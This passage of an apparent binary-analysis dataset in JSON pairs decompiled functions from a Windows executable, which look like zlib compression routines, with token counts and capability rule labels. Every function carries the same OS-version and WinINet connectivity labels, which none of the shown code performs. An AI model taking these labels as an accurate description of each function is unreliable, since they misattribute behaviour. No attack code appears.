        "decompiled_code": "\nuint fcn.004719a8(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((in_EAX != 0) && (*(in_EAX + 0x1c) != 0)) && (*(in_EAX + 0x24) != 0)) {\n        if (*(*(in_EAX + 0x1c) + 0x30) != 0) {\n            (**(in_EAX + 0x24))();\n        }\n        (**(in_EAX + 0x24))();\n        *(in_EAX + 0x1c) = 0;\n        return 0;\n    }\n    return 0xfffffffe;\n}\n",
        "token_count": 147
    },
    "00471d18": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00471d18(uint16_t *arg_8h, uint32_t *arg_ch, int32_t *arg_10h)\n\n{\n    int16_t *piVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    int32_t in_EAX;\n    uint *puVar5;\n    uint uVar6;\n    uint16_t *puVar7;\n    uint32_t uVar8;\n    uint32_t in_ECX;\n    int32_t iVar9;\n    uint8_t uVar10;\n    uint16_t *in_EDX;\n    uint32_t uVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    uint16_t var_84h;\n    uint var_82h;\n    uint var_64h;\n    uint16_t *var_46h;\n    int32_t var_40h;\n    uint16_t *var_3ch;\n    uint16_t *var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint16_t *var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    puVar5 = &var_64h;\n    var_8h = in_EDX;\n    var_4h = in_EAX;\n    do {\n        *puVar5 = 0;\n        var_ch = var_ch + 1;\n        puVar5 = puVar5 + 2;\n    } while (var_ch < 0x10);\n    uVar11 = 0;\n    puVar7 = var_8h;\n    if (in_ECX != 0) {\n        do {\n            uVar3 = *puVar7;\n            puVar7 = puVar7 + 1;\n            uVar11 = uVar11 + 1;\n            piVar1 = &var_64h + uVar3 * 2;\n            *piVar1 = *piVar1 + 1;\n        } while (uVar11 < in_ECX);\n    }\n    puVar5 = &var_46h;\n    var_18h = *arg_ch;\n    var_14h = 0xf;\n    do {\n        if (*puVar5 != 0) break;\n        var_14h = var_14h - 1;\n        puVar5 = puVar5 + -2;\n    } while (var_14h != 0);\n    if (var_14h < *arg_ch) {\n        var_18h = var_14h;\n    }\n    if (var_14h == 0) {\n        puVar5 = *arg_10h;\n        *arg_10h = *arg_10h + 4;\n        *puVar5 = 0x140;\n        puVar5 = *arg_10h;\n        *arg_10h = *arg_10h + 4;\n        *puVar5 = 0x140;\n        uVar6 = 0;\n        *arg_ch = 1;\n    }\n    else {\n        var_10h = 1;\n        stack0xffffffb8 = &var_64h + 2;\n        do {\n            if (*stack0xffffffb8 != 0) break;\n            var_10h = var_10h + 1;\n            stack0xffffffb8 = stack0xffffffb8 + 1;\n        } while (var_10h < 0x10);\n        if (var_18h < var_10h) {\n            var_18h = var_10h;\n        }\n        var_ch = 1;\n        iVar12 = 1;\n        puVar7 = &var_64h + 2;\n        do {\n            iVar12 = iVar12 * 2 - *puVar7;\n            if (iVar12 < 0) {\n                return 0xffffffff;\n            }\n            var_ch = var_ch + 1;\n            puVar7 = puVar7 + 1;\n        } while (var_ch < 0x10);\n        if ((iVar12 < 1) || ((var_4h != 0 && (var_14h == 1)))) {\n            var_82h._0_2_ = 0;\n            var_ch = 1;\n            puVar5 = &var_82h;\n            stack0xffffffb8 = &var_64h + 2;\n            do {\n                *(puVar5 + 2) = *puVar5 + *stack0xffffffb8;\n                puVar5 = puVar5 + 2;\n                var_ch = var_ch + 1;\n                stack0xffffffb8 = stack0xffffffb8 + 1;\n            } while (var_ch < 0xf);\n            uVar11 = 0;\n            stack0xffffffb8 = var_8h;\n            if (in_ECX != 0) {\n                do {\n                    uVar3 = *stack0xffffffb8;\n                    if (uVar3 != 0) {\n                        uVar2 = (&var_84h)[uVar3];\n                        (&var_84h)[uVar3] = (&var_84h)[uVar3] + 1;\n                        arg_8h[uVar2] = uVar11;\n                    }\n                    uVar11 = uVar11 + 1;\n                    stack0xffffffb8 = stack0xffffffb8 + 1;\n                } while (uVar11 < in_ECX);\n            }\n            if (var_4h == 0) {\n                var_3ch = arg_8h;\n                var_38h = arg_8h;\n                var_40h = 0x13;\n            }\n            else if (var_4h == 1) {\n                var_38h = 0x49148a;\n                var_3ch = 0x4914c8;\n                var_40h = 0x100;\n            }\n            else {\n                var_38h = 0x491708;\n                var_3ch = 0x491748;\n                var_40h = -1;\n            }\n            var_ch = var_10h;\n            uVar11 = 0;\n            var_34h = *arg_10h;\n            var_1ch = 0;\n            var_28h = 0xffffffff;\n            var_20h = 1 << (var_18h & 0x1f);\n            var_2ch = var_20h - 1;\n            if ((var_4h != 1) || (var_20h < 0x5b0)) {\n                stack0xffffffb8 = arg_8h;\n                uVar8 = var_18h;\n                while( true ) {\n                    do {\n                        uVar4 = var_ch;\n                        uVar10 = var_ch - var_1ch;\n                        uVar13 = *stack0xffffffb8;\n                        if (uVar13 < var_40h) {\n                            var_30h = uVar10 << 8;\n                            var_30h = var_30h | *stack0xffffffb8 << 0x10;\n                        }\n                        else if (var_40h < uVar13) {\n                            var_30h = CONCAT22(var_38h[uVar13], CONCAT11(uVar10, *(var_3ch + uVar13)));\n                        }\n                        else {\n                            var_30h = CONCAT31(uVar10, 0x60);\n                        }\n                        var_24h = 1 << (uVar8 & 0x1f);\n                        var_10h = var_24h;\n                        do {\n                            var_24h = var_24h - (1 << (var_ch - var_1ch & 0x1f));\n                            *(var_34h + ((uVar11 >> (var_1ch & 0x1f)) + var_24h) * 4) = var_30h;\n                        } while (var_24h != 0);\n                        for (uVar13 = 1 << (var_ch - 1U & 0x1f); (uVar13 & uVar11) != 0; uVar13 = uVar13 >> 1) {\n                        }\n                        if (uVar13 == 0) {\n                            uVar11 = 0;\n                        }\n                        else {\n                            uVar11 = (uVar11 & uVar13 - 1) + uVar13;\n                        }\n                        stack0xffffffb8 = stack0xffffffb8 + 1;\n                        piVar1 = &var_64h + var_ch * 2;\n                        *piVar1 = *piVar1 + -1;\n                        if (*(&var_64h + uVar4 * 2) == 0) {\n                            if (var_ch == var_14h) {\n                                var_30h._0_2_ = CONCAT11(var_ch - var_1ch, 0x40);\n                                var_30h = var_30h;\n                                while (uVar11 != 0) {\n                                    if ((var_1ch != 0) && ((var_2ch & uVar11) != var_28h)) {\n                                        var_1ch = 0;\n                                        var_ch = var_18h;\n                                        var_34h = *arg_10h;\n                                        var_30h._0_2_ = CONCAT11(var_18h, var_30h);\n                                        var_30h = var_30h;\n                                    }\n                                    *(var_34h + (uVar11 >> (var_1ch & 0x1f)) * 4) = var_30h;\n                                    for (uVar8 = 1 << (var_ch - 1U & 0x1f); (uVar8 & uVar11) != 0; uVar8 = uVar8 >> 1) {\n                                    }\n                                    if (uVar8 == 0) {\n                                        uVar11 = 0;\n                                    }\n                                    else {\n                                        uVar11 = (uVar11 & uVar8 - 1) + uVar8;\n                                    }\n                                }\n                                *arg_10h = *arg_10h + var_20h * 4;\n                                *arg_ch = var_18h;\n                                return 0;\n                            }\n                            var_ch = var_8h[*stack0xffffffb8];\n                        }\n                    } while ((var_ch <= var_18h) || ((var_2ch & uVar11) == var_28h));\n                    if (var_1ch == 0) {\n                        var_1ch = var_18h;\n                    }\n                    var_34h = var_34h + var_10h * 4;\n                    uVar8 = var_ch - var_1ch;\n                    for (iVar12 = 1 << (uVar8 & 0x1f);\n                        (var_1ch + uVar8 < var_14h &&\n                        (iVar12 = iVar12 - *(&var_64h + (var_1ch + uVar8) * 2),  0 < iVar12)); iVar12 = iVar12 * 2) {\n                        uVar8 = uVar8 + 1;\n                    }\n                    var_20h = var_20h + (1 << (uVar8 & 0x1f));\n                    if ((var_4h == 1) && (0x5af < var_20h)) break;\n                    var_28h = var_2ch & uVar11;\n                    iVar12 = *arg_10h;\n                    *(iVar12 + var_28h * 4) = uVar8;\n                    *(iVar12 + 1 + var_28h * 4) = var_18h;\n                    iVar9 = var_34h - iVar12;\n                    if (iVar9 < 0) {\n                        iVar9 = iVar9 + 3;\n                    }\n                    *(iVar12 + 2 + var_28h * 4) = iVar9 >> 2;\n                }\n                return 1;\n            }\n            uVar6 = 1;\n        }\n        else {\n            uVar6 = 0xffffffff;\n        }\n    }\n    return uVar6;\n}\n",
        "token_count": 2738
    },
    "0047235c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047235c(uint param_1, int32_t *param_2)\n\n{\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t in_EAX;\n    int32_t *piVar7;\n    ushort *puVar8;\n    int16_t *piVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    int32_t iStack36;\n    int32_t iStack32;\n    int32_t iStack24;\n    \n    iVar3 = param_2[1];\n    iVar4 = *param_2;\n    piVar7 = param_2[2];\n    iVar12 = *piVar7;\n    iVar5 = piVar7[1];\n    iVar6 = piVar7[2];\n    uVar13 = piVar7[4];\n    iStack24 = 0;\n    iVar10 = 0;\n    puVar8 = in_EAX + 0xb38;\n    do {\n        *puVar8 = 0;\n        iVar10 = iVar10 + 1;\n        puVar8 = puVar8 + 1;\n    } while (iVar10 < 0x10);\n    *(iVar4 + 2 + *(in_EAX + 0xb58 + *(in_EAX + 0x1450) * 4) * 4) = 0;\n    iStack36 = *(in_EAX + 0x1450) + 1;\n    piVar7 = in_EAX + 0xb58 + iStack36 * 4;\n    for (; iStack36 < 0x23d; iStack36 = iStack36 + 1) {\n        iVar10 = *piVar7;\n        uVar11 = *(iVar4 + 2 + *(iVar4 + 2 + iVar10 * 4) * 4) + 1;\n        if (uVar13 < uVar11) {\n            iStack24 = iStack24 + 1;\n            uVar11 = uVar13;\n        }\n        *(iVar4 + 2 + iVar10 * 4) = uVar11;\n        if (iVar10 <= iVar3) {\n            piVar9 = in_EAX + 0xb38 + uVar11 * 2;\n            *piVar9 = *piVar9 + 1;\n            iStack32 = 0;\n            if (iVar6 <= iVar10) {\n                iStack32 = *(iVar5 + (iVar10 - iVar6) * 4);\n            }\n            uVar2 = *(iVar4 + iVar10 * 4);\n            *(in_EAX + 0x16a4) = *(in_EAX + 0x16a4) + uVar2 * (uVar11 + iStack32);\n            if (iVar12 != 0) {\n                *(in_EAX + 0x16a8) = *(in_EAX + 0x16a8) + (*(iVar12 + 2 + iVar10 * 4) + iStack32) * uVar2;\n            }\n        }\n        piVar7 = piVar7 + 1;\n    }\n    if (iStack24 != 0) {\n        do {\n            iVar12 = uVar13 - 1;\n            for (piVar9 = in_EAX + 0xb38 + iVar12 * 2; *piVar9 == 0; piVar9 = piVar9 + -1) {\n                iVar12 = iVar12 + -1;\n            }\n            piVar9 = in_EAX + 0xb38 + iVar12 * 2;\n            *piVar9 = *piVar9 + -1;\n            piVar9 = in_EAX + 0xb3a + iVar12 * 2;\n            *piVar9 = *piVar9 + 2;\n            piVar9 = in_EAX + 0xb38 + uVar13 * 2;\n            *piVar9 = *piVar9 + -1;\n            iStack24 = iStack24 + -2;\n        } while (0 < iStack24);\n        puVar1 = in_EAX + 0xb38 + uVar13 * 2;\n        for (; uVar13 != 0; uVar13 = uVar13 - 1) {\n            uVar11 = *puVar1;\n            while (piVar7 = in_EAX + 0xb58 + iStack36 * 4,  uVar11 != 0) {\n                while( true ) {\n                    iStack36 = iStack36 + -1;\n                    piVar7 = piVar7 + -1;\n                    iVar12 = *piVar7;\n                    if (iVar3 < iVar12) break;\n                    if (*(iVar4 + 2 + iVar12 * 4) != uVar13) {\n                        *(in_EAX + 0x16a4) =\n                             *(in_EAX + 0x16a4) + (uVar13 - *(iVar4 + 2 + iVar12 * 4)) * *(iVar4 + iVar12 * 4);\n                        *(iVar4 + 2 + iVar12 * 4) = uVar13;\n                    }\n                    uVar11 = uVar11 - 1;\n                    if (uVar11 == 0) goto code_r0x00472549;\n                }\n            }\ncode_r0x00472549:\n            puVar1 = puVar1 + -1;\n        }\n    }\n    return;\n}\n",
        "token_count": 1226
    },
    "004725cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004725cc(uint param_1, int16_t **param_2)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    int32_t in_EAX;\n    int16_t *piVar5;\n    char cVar6;\n    uchar *puVar7;\n    int16_t *piVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int16_t *piStack20;\n    \n    piVar8 = NULL;\n    piVar3 = *param_2;\n    iVar9 = *param_2[2];\n    puVar7 = in_EAX + 0x1454;\n    iVar10 = *(param_2[2] + 0xc);\n    piStack20 = 0xffffffff;\n    *(in_EAX + 0x144c) = 0;\n    *(in_EAX + 0x1450) = 0x23d;\n    piVar5 = piVar3;\n    if (0 < iVar10) {\n        do {\n            if (*piVar5 == 0) {\n                piVar5[1] = 0;\n            }\n            else {\n                *(in_EAX + 0x144c) = *(in_EAX + 0x144c) + 1;\n                *(in_EAX + 0xb58 + *(in_EAX + 0x144c) * 4) = piVar8;\n                *puVar7 = 0;\n                piStack20 = piVar8;\n            }\n            piVar8 = piVar8 + 1;\n            puVar7 = puVar7 + 1;\n            piVar5 = piVar5 + 2;\n        } while (piVar8 < iVar10);\n    }\n    while (*(in_EAX + 0x144c) < 2) {\n        if (piStack20 < 2) {\n            piVar5 = piStack20 + 1;\n            piStack20 = piVar5;\n        }\n        else {\n            piVar5 = NULL;\n        }\n        *(in_EAX + 0x144c) = *(in_EAX + 0x144c) + 1;\n        *(in_EAX + 0xb58 + *(in_EAX + 0x144c) * 4) = piVar5;\n        piVar3[piVar5 * 2] = 1;\n        *(in_EAX + 0x1454 + piVar5) = 0;\n        *(in_EAX + 0x16a4) = *(in_EAX + 0x16a4) + -1;\n        if (iVar9 != 0) {\n            *(in_EAX + 0x16a8) = *(in_EAX + 0x16a8) - *(iVar9 + 2 + piVar5 * 4);\n        }\n    }\n    param_2[1] = piStack20;\n    iVar9 = *(in_EAX + 0x144c) >> 1;\n    if (iVar9 < 0) {\n        iVar9 = iVar9 + ((*(in_EAX + 0x144c) & 1) != 0);\n    }\n    for (; 0 < iVar9; iVar9 = iVar9 + -1) {\n        fcn.00472268();\n    }\n    do {\n        iVar9 = *(in_EAX + 0x144c);\n        iVar4 = *(in_EAX + 0xb5c);\n        *(in_EAX + 0x144c) = *(in_EAX + 0x144c) + -1;\n        *(in_EAX + 0xb5c) = *(in_EAX + 0xb58 + iVar9 * 4);\n        fcn.00472268();\n        iVar9 = *(in_EAX + 0xb5c);\n        *(in_EAX + 0x1450) = *(in_EAX + 0x1450) + -1;\n        *(in_EAX + 0xb58 + *(in_EAX + 0x1450) * 4) = iVar4;\n        *(in_EAX + 0x1450) = *(in_EAX + 0x1450) + -1;\n        *(in_EAX + 0xb58 + *(in_EAX + 0x1450) * 4) = iVar9;\n        piVar3[iVar10 * 2] = piVar3[iVar9 * 2] + piVar3[iVar4 * 2];\n        uVar2 = *(in_EAX + 0x1454 + iVar9);\n        puVar1 = in_EAX + 0x1454 + iVar4;\n        if (uVar2 < *puVar1 || uVar2 == *puVar1) {\n            cVar6 = *(in_EAX + 0x1454 + iVar4);\n        }\n        else {\n            cVar6 = *(in_EAX + 0x1454 + iVar9);\n        }\n        *(in_EAX + 0x1454 + iVar10) = cVar6 + '\\x01';\n        piVar3[iVar9 * 2 + 1] = iVar10;\n        piVar3[iVar4 * 2 + 1] = iVar10;\n        *(in_EAX + 0xb5c) = iVar10;\n        iVar10 = iVar10 + 1;\n        fcn.00472268();\n    } while (1 < *(in_EAX + 0x144c));\n    *(in_EAX + 0x1450) = *(in_EAX + 0x1450) + -1;\n    *(in_EAX + 0xb58 + *(in_EAX + 0x1450) * 4) = *(in_EAX + 0xb5c);\n    fcn.0047235c();\n    fcn.0047255c();\n    return;\n}\n",
        "token_count": 1302
    },
    "00472f70": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00472f70(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint8_t *puVar2;\n    \n    fcn.004727dc();\n    fcn.004727dc();\n    fcn.004725cc();\n    iVar1 = 0x12;\n    puVar2 = 0x491f22;\n    do {\n        if (*(in_EAX + 0xa7a + *puVar2 * 4) != 0) break;\n        iVar1 = iVar1 + -1;\n        puVar2 = puVar2 + -1;\n    } while (2 < iVar1);\n    *(in_EAX + 0x16a4) = *(in_EAX + 0x16a4) + iVar1 * 3 + 0x11;\n    return;\n}\n",
        "token_count": 185
    },
    "0047392c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047392c(int32_t param_1, int32_t param_2)\n\n{\n    uint8_t uVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t in_EAX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int16_t iVar8;\n    uint32_t uVar9;\n    uint32_t uStack32;\n    \n    uStack32 = 0;\n    if (*(in_EAX + 0x169c) != 0) {\n        do {\n            uVar7 = *(*(in_EAX + 0x16a0) + uStack32 * 2);\n            uVar9 = *(*(in_EAX + 0x1694) + uStack32);\n            uStack32 = uStack32 + 1;\n            if (uVar7 == 0) {\n                uVar7 = *(param_2 + 2 + uVar9 * 4);\n                if (0x10 - uVar7 < *(in_EAX + 0x16b8)) {\n                    uVar2 = *(param_2 + uVar9 * 4);\n                    *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar2 << (*(in_EAX + 0x16b8) & 0x1f);\n                    iVar3 = *(in_EAX + 0x14);\n                    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                    *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4);\n                    iVar3 = *(in_EAX + 0x14);\n                    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                    *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4) >> 8;\n                    *(in_EAX + 0x16b4) = uVar2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                    *(in_EAX + 0x16b8) = (uVar7 - 0x10) + *(in_EAX + 0x16b8);\n                }\n                else {\n                    *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *(param_2 + uVar9 * 4) << (*(in_EAX + 0x16b8) & 0x1f);\n                    *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar7;\n                }\n            }\n            else {\n                uVar6 = *(uVar9 + 0x492123);\n                uVar5 = *(param_2 + 0x406 + uVar6 * 4);\n                if (0x10 - uVar5 < *(in_EAX + 0x16b8)) {\n                    uVar2 = *(param_2 + 0x404 + uVar6 * 4);\n                    *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar2 << (*(in_EAX + 0x16b8) & 0x1f);\n                    iVar3 = *(in_EAX + 0x14);\n                    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                    *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4);\n                    iVar3 = *(in_EAX + 0x14);\n                    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                    *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4) >> 8;\n                    *(in_EAX + 0x16b4) = uVar2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                    *(in_EAX + 0x16b8) = (uVar5 - 0x10) + *(in_EAX + 0x16b8);\n                }\n                else {\n                    *(in_EAX + 0x16b4) =\n                         *(in_EAX + 0x16b4) | *(param_2 + 0x404 + uVar6 * 4) << (*(in_EAX + 0x16b8) & 0x1f);\n                    *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar5;\n                }\n                iVar3 = *(uVar6 * 4 + 0x4917b8);\n                if (iVar3 != 0) {\n                    uVar9 = uVar9 - *(uVar6 * 4 + 0x491de8);\n                    iVar8 = uVar9;\n                    if (0x10 - iVar3 < *(in_EAX + 0x16b8)) {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar8 << (*(in_EAX + 0x16b8) & 0x1f);\n                        iVar4 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4);\n                        iVar4 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4) >> 8;\n                        *(in_EAX + 0x16b4) = (uVar9 & 0xffff) >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = iVar3 + -0x10 + *(in_EAX + 0x16b8);\n                    }\n                    else {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar8 << (*(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + iVar3;\n                    }\n                }\n                uVar9 = uVar7 - 1;\n                if (uVar9 < 0x100) {\n                    uVar1 = *(uVar7 + 0x491f22);\n                }\n                else {\n                    uVar1 = *((uVar9 >> 7) + 0x492023);\n                }\n                uVar7 = uVar1;\n                uVar5 = *(param_1 + 2 + uVar7 * 4);\n                if (0x10 - uVar5 < *(in_EAX + 0x16b8)) {\n                    uVar2 = *(param_1 + uVar7 * 4);\n                    *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar2 << (*(in_EAX + 0x16b8) & 0x1f);\n                    iVar3 = *(in_EAX + 0x14);\n                    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                    *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4);\n                    iVar3 = *(in_EAX + 0x14);\n                    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                    *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4) >> 8;\n                    *(in_EAX + 0x16b4) = uVar2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                    *(in_EAX + 0x16b8) = (uVar5 - 0x10) + *(in_EAX + 0x16b8);\n                }\n                else {\n                    *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *(param_1 + uVar7 * 4) << (*(in_EAX + 0x16b8) & 0x1f);\n                    *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar5;\n                }\n                iVar3 = *(uVar7 * 4 + 0x49182c);\n                if (iVar3 != 0) {\n                    uVar9 = uVar9 - *(uVar7 * 4 + 0x491e5c);\n                    iVar8 = uVar9;\n                    if (0x10 - iVar3 < *(in_EAX + 0x16b8)) {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar8 << (*(in_EAX + 0x16b8) & 0x1f);\n                        iVar4 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4);\n                        iVar4 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4) >> 8;\n                        *(in_EAX + 0x16b4) = (uVar9 & 0xffff) >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = iVar3 + -0x10 + *(in_EAX + 0x16b8);\n                    }\n                    else {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar8 << (*(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + iVar3;\n                    }\n                }\n            }\n        } while (uStack32 < *(in_EAX + 0x169c));\n    }\n    uVar7 = *(param_2 + 0x402);\n    if (0x10 - uVar7 < *(in_EAX + 0x16b8)) {\n        uVar2 = *(param_2 + 0x400);\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar2 << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar3 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4);\n        iVar3 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = uVar2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = (uVar7 - 0x10) + *(in_EAX + 0x16b8);\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *(param_2 + 0x400) << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar7;\n    }\n    *(in_EAX + 0x16b0) = *(param_2 + 0x402);\n    return;\n}\n",
        "token_count": 2956
    },
    "00473dec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00473dec(void)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    piVar1 = in_EAX + 0x24;\n    do {\n        if (*piVar1 != 0) break;\n        iVar2 = iVar2 + 1;\n        piVar1 = piVar1 + 1;\n    } while (iVar2 < 9);\n    if (iVar2 == 9) {\n        iVar2 = 0xe;\n        piVar1 = in_EAX + 0x32;\n        do {\n            if (*piVar1 != 0) break;\n            iVar2 = iVar2 + 1;\n            piVar1 = piVar1 + 1;\n        } while (iVar2 < 0x20);\n    }\n    *(*in_EAX + 0x2c) = iVar2 == 0x20;\n    return;\n}\n",
        "token_count": 213
    },
    "00473ec8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00473ec8(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x16b8) < 9) {\n        if (0 < *(in_EAX + 0x16b8)) {\n            iVar1 = *(in_EAX + 0x14);\n            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n            *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        }\n    }\n    else {\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n    }\n    *(in_EAX + 0x16b4) = 0;\n    *(in_EAX + 0x16b8) = 0;\n    return;\n}\n",
        "token_count": 317
    },
    "00473f30": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
